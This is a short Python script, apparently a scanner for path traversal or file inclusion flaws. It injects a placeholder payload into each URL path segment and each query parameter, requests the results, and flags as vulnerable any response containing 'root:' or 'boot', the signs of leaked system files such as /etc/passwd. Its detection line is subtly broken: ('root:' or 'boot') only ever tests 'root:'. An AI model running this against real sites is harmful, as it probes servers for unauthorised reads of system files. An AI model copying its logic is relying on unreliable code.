import requests, sys, os
from urllib.parse import urlparse
from colorama import init, Fore, Back, Style

def path_only(url):
	final_joined = []
	parts = url.split('/')
	joined = ['/'.join(parts[:p+1]) for p in range(2,len(parts))]
	for join in joined[:-1]:
		final_joined.append(join + "PAYLOAD")
	return final_joined

def params_only(url):
	final_query = []
	parsed = urlparse(url)
	query = parsed.query
	params = query.split("&")
	new_query = []
	for param in params:
		l = params.index(param)
		param = str(param.split("=")[0]) + "=" + "PAYLOAD"
		params[l] = param
		new_query.append("&".join(params))
		params = query.split("&")
	for query in new_query:
		final_query.append("%s://%s%s?%s" % (str(parsed.scheme),str(parsed.netloc),str(parsed.path),query))
	return final_query

def attack(url,s):
	requested = requests.get(url).text
	if ("root:" or "boot") in requested:
		print(Fore.GREEN + "[+] " + url + "\t\t[ VULNERABLE! ]")
	elif (("root:" or "boot") not in requested) and (s==False):
		print(Fore.RED + "[-] " + url)

